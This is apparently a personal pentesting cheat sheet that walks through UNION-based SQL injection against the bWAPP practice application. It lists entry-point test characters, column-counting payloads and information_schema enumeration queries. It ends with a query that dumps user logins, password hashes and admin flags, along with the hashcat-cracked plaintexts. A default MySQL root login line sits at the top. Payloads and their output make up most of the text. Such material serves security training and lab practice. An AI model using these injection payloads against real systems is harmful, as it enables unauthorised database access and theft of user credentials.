# default credentials connection:

mysql -u root -h ip 

# SQL injectoin

All examples are based on bWAPP (free pentesting practice tool) examples.

## Test for SQLi vulnerability
* It is necessary to identify a possible SQLi entry point
* Use of special characters can help (got from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)):

```
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content

Multiple encoding

%%2727
%25%27

Merging characters

`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP

Logic Testing

page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

Weird characters

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```


## UNION based sql injection

### MYSQL Comment
-- - Note the space after the double dash
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MYSQL version 3.23.02

-- - to emphasize space

1. Get number of columns

```
1' order by 1; -- -- ok
1' order by 2; -- -- ok
...
1' order by 7; -- -- ok
1' order by 8; -- -- error -> 7 columns available

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

#using NULL is benficial if it is not certain if data types in columns match

```
Other faster methods (if error messages are enabled):

```
' UNION SELECT 1,2,3,4,5,6,7; -- --	True

1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100; -- --

```
* Note: for oracle add FROM DUAL like so:

```
' UNION SELECT NULL FROM DUAL--
```

2. identify vulnerable columns

```
-' union all select 1,2,3,4,5,6,7; -- --

Title 	Release 	Character 	Genre 	IMDb
2 	3 	5 	4 	Link

#columns 2,3,4,5 are vulnerable
```

Get Database version:

```
-' union all select 1,@@version,3,4,5,6,7; -- -

#5.0.96-0ubuntu3 > 5 -> continue with table name enumeration

#for database name

-' union all select 1,database(),3,4,5,6,7; -- -

#we get bWAPP

#time for table name

-' union all select 1,group_concat(0x7c,table_name,0x7C),3,4,5,6,7 from information_schema.tables where table_schema=database(); -- -

#output: blog,heroes,movies,users,visitors

#get column names from users table

-' union all select 1,group_concat(0x7c,column_name,0x7C),3,4,5,6,7 from information_schema.columns where table_schema=database(); -- -

#output for column names: id,owner,entry,date,id,login,password,secret,id,title,release_year,genre,main_character,imdb,tickets_stock,id,login,password,email,secret,activation_code,activated,reset_code,admin,id,ip_address,user_agent,date

#columns of particular table 
#encode table name "users" as decimal using: http://www.unit-conversion.info/texttools/ascii/

-' union all select 1,group_concat(0x7c,column_name,0x7C),3,4,5,6,7 from information_schema.columns where table_name=char(117,115,101,114,115); -- -

#output of columns in "users": id,login,password,email,secret,activation_code,activated,reset_code,admin,uid,name,pass,mail,theme,signature,signature_format,created,access,login,status,timezone,language,picture,init,data

#lets get login and password 

-' union all select 1,group_concat(login,0x7C,password,0x7C,admin),3,4,5,6,7 from users; -- -

#output.
#A.I.M.|6885858486f31043e5839c735d99457f045affd0|1,bee|6885858486f31043e5839c735d99457f045affd0|1,ok|#7a85f4764bbd6daf1c3545efbbf0f279a6dc0beb|0
#obviously column with 1 indicates admin
#cracking with hashcat delivers:
#6885858486f31043e5839c735d99457f045affd0:bug
#7a85f4764bbd6daf1c3545efbbf0f279a6dc0beb:ok


```



















